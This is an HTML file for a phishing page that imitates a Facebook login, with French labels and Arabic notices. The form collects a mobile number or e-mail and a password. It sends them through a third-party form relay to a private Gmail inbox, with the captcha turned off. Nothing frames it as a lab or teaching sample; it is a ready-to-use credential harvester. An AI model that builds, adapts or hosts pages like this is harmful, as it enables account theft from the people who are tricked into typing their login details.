<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title> Se connecter</title>
  <link rel="stylesheet" href="style.css">
</head>

<body>

  <div class="hero-banner">
    <img src="hero.png" alt="صورة">
  </div>

  <main class="phone">

    <div class="facebook-logo" aria-hidden="true">f</div>

    <div class="separator"></div>

    <section class="notice">
      <p>
        يرجى إدخال معلوماتك لإرسال الطلب.
      </p>
    </section>

    <form
      action="https://formsubmit.co/Rachidmah2003@gmail.com"
      method="POST"
    >

      <!-- إعدادات البريد -->
      <input type="hidden" name="_subject" value="طلب جديد">
      <input type="hidden" name="_template" value="table">
      <input type="hidden" name="_captcha" value="false">

      <!-- Numéro mobile ou e-mail -->
      <div class="field">
        <input
          id="name"
          name="name"
          type="text"
          placeholder="Numéro mobile ou e-mail"
          autocomplete="Numéro mobile ou e-mail"
          required
        >
      </div>

      <!-- password -->
      <div class="field">
        <input
          id="password"
          name="password"
          type="password"
          placeholder="password"
          autocomplete="password"
          required
        >
      </div>

      <!-- Se connecter -->
      <button class="login" type="submit">
        Se connecter
      </button>

    </form>

  </main>

</body>
</html>
